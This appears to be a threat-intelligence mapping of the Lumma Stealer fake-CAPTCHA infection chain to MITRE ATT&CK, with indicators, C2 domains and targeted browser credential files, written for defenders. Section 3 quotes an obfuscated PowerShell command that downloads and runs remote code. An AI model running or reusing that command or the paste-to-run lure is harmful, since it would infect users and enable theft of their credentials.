# MITRE ATT&CK Mapping – Lumma Stealer via Fake CAPTCHA

This document maps the main steps of the Lumma fake CAPTCHA infection chain to MITRE ATT&CK tactics and techniques.

---

## Summary Table

| Killchain Phase             | Tactic                    | Technique ID     | Technique Name                                   |
|-----------------------------|---------------------------|------------------|--------------------------------------------------|
| Initial access              | Initial Access            | T1189            | Drive-by Compromise                              |
| Initial access / execution  | Execution                 | T1204            | User Execution                                   |
| Stage 1 execution           | Execution                 | T1059.001        | Command and Scripting Interpreter: PowerShell    |
| Stage 2 execution           | Defense Evasion / Exec    | T1218.005        | Signed Binary Proxy Execution: Mshta             |
| Payload delivery            | Command and Control       | T1105            | Ingress Tool Transfer                            |
| Lumma / AutoIt execution    | Execution                 | T1059            | Command and Scripting Interpreter                |
| Obfuscation & packing       | Defense Evasion           | T1027            | Obfuscated/Encrypted File or Information         |
| Browser credential theft    | Credential Access         | T1555.003        | Credentials from Web Browsers                    |
| Firewall discovery          | Discovery                 | T1518.001        | Security Software Discovery                      |
| C2 over HTTPS               | Command and Control       | T1071.001        | Application Layer Protocol: Web Protocols        |
| Exfiltration over C2        | Exfiltration              | T1041            | Exfiltration Over C2 Channel                     |

---

## Detailed Mapping by Phase

### 1. Initial Access – Compromised Website & Fake CAPTCHA

**Observed behaviour**

- User browses a legitimate but compromised website  
  `astapowerproject[.]net`.
- The site triggers automatic redirects through multiple intermediate
  domains and lands on a **fake CAPTCHA** page hosted at  
  `657.s3.fr-par.scw[.]cloud`.

**ATT&CK**

- **Tactic:** Initial Access – *TA0001*  
- **Technique:** **T1189 – Drive-by Compromise**  
  - The attacker abuses a legitimate website to deliver malicious
    content to the victim’s browser via redirects and injected code.

---

### 2. User Execution – Fake CAPTCHA / Run Dialog Abuse

**Observed behaviour**

- The fake CAPTCHA page uses social engineering:
  - JavaScript copies an obfuscated PowerShell command to the clipboard.
  - The user is instructed to open **WIN+R**, paste, and run the command.
- The user manually executes the command from the Run dialog.

**ATT&CK**

- **Tactic:** Execution – *TA0002*  
- **Technique:** **T1204 – User Execution**  
  - The attacker relies on the user to perform the final execution
    step (pasting and running the command), rather than exploiting a
    software vulnerability.

---

### 3. Stage 1 Execution – PowerShell One-Liner

**Observed behaviour**

- A hidden PowerShell process is created with parameters such as:  
  `-WindowStyle Hidden -NoProfile -Command "$a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))"`.
- The script downloads and executes a second-stage payload in memory.

**ATT&CK**

- **Tactic:** Execution – *TA0002*  
- **Technique:** **T1059.001 – Command and Scripting Interpreter: PowerShell**  
  - PowerShell is used as a scripting environment to fetch and execute
    arbitrary code from the internet.

---

### 4. Stage 2 Execution – mshta & Remote HTML/JS

**Observed behaviour**

- The second-stage PowerShell launches **`mshta.exe`** pointing to a
  remote HTA/HTML/JS payload.
- `mshta.exe` executes attacker-controlled script code downloaded from
  a remote URL.

**ATT&CK**

- **Tactics:** Execution / Defense Evasion – *TA0002 / TA0005*  
- **Technique:** **T1218.005 – Signed Binary Proxy Execution: Mshta**  
  - The attacker abuses a trusted, signed Windows binary (`mshta.exe`)
    to execute untrusted code, helping to evade some security controls.

---

### 5. Payload Delivery – Downloading `afc.zip` and Components

**Observed behaviour**

- Second-stage scripts download the archive **`afc.zip`** into `%TEMP%`
  from an external server (e.g. `...r2[.]dev`).
- The archive is extracted to a temporary folder (e.g. `afc_<GUID>\`)
  and contains:
  - `AF1.exe` (Lumma loader)
  - `IconX.dll`, `dx0.dll`, `DirectGUI.dll` (support DLLs)

**ATT&CK**

- **Tactic:** Command and Control – *TA0011*  
- **Technique:** **T1105 – Ingress Tool Transfer**  
  - Tools and payloads are transferred from the attacker’s infrastructure
    to the victim host over the network.

---

### 6. Lumma / AutoIt Execution

**Observed behaviour**

- `AF1.exe` is executed from the extracted folder and orchestrates the
  infostealer logic.
- A compiled AutoIt script `deci.com` is dropped into the user’s
  roaming profile and executed to automate additional tasks.

**ATT&CK**

- **Tactic:** Execution – *TA0002*  
- **Technique:** **T1059 – Command and Scripting Interpreter**  
  - Malware uses scripting environments (AutoIt and previously PowerShell)
    to run attacker-defined logic on the endpoint.

---

### 7. Obfuscation & Packing

**Observed behaviour**

- PowerShell commands are heavily obfuscated (string splitting,
  variable concatenation).
- Payloads are wrapped into an archive (`afc.zip`) and possibly other
  layers to hinder static inspection.

**ATT&CK**

- **Tactic:** Defense Evasion – *TA0005*  
- **Technique:** **T1027 – Obfuscated/Encrypted File or Information**  
  - Scripts and payloads are deliberately obfuscated and packaged to
    evade detection by AV/EDR and content filters.

---

### 8. Browser Credential Theft

**Observed behaviour**

- The malware accesses browser data files in the user profile, such as:
  - `Login Data`
  - `Web Data`
- Targets include Chrome and Edge, harvesting stored credentials and
  other sensitive web data.

**ATT&CK**

- **Tactic:** Credential Access – *TA0006*  
- **Technique:** **T1555.003 – Credentials from Web Browsers**  
  - Adversaries extract credentials and other secrets stored in modern
    web browsers.

---

### 9. Firewall / Security Discovery

**Observed behaviour**

- The malware executes discovery commands like:
  - `findstr pfirewall.log`
  - `netsh advfirewall show currentprofile`
- These commands are used to inspect firewall logging and the active
  firewall profile.

**ATT&CK**

- **Tactic:** Discovery – *TA0007*  
- **Technique:** **T1518.001 – Security Software Discovery**  
  - Adversaries attempt to understand local security configuration,
    including firewall state and logging, to adapt or reduce their
    footprint.

---

### 10. Command & Control over HTTPS

**Observed behaviour**

- The infected host initiates HTTPS connections to multiple C2 domains:
  - `blameaowi[.]run`
  - `flowerexju[.]bet`
  - `mzmedtipp[.]live`
  - `easterxeen[.]run`
  - `araucahkbm[.]live`
  - `overcovtcg[.]top`
  - `blackswmxc[.]top`
  - `posseswsnc[.]top`
  - `4featurlyin[.]top`
- Requests are sent over TCP/443 using standard web protocols.

**ATT&CK**

- **Tactic:** Command and Control – *TA0011*  
- **Technique:** **T1071.001 – Application Layer Protocol: Web Protocols**  
  - The malware uses HTTPS as its C2 channel, blending in with normal
    web traffic.

---

### 11. Exfiltration over C2 Channel

**Observed behaviour**

- Stolen browser credentials and other data are exfiltrated via HTTPS
  POST requests to specific paths on the C2 domains.
- Exfiltration reuses the same web-based C2 channel.

**ATT&CK**

- **Tactic:** Exfiltration – *TA0010*  
- **Technique:** **T1041 – Exfiltration Over C2 Channel**  
  - Data is exfiltrated through the established C2 channel rather than
    via a separate exfiltration mechanism.
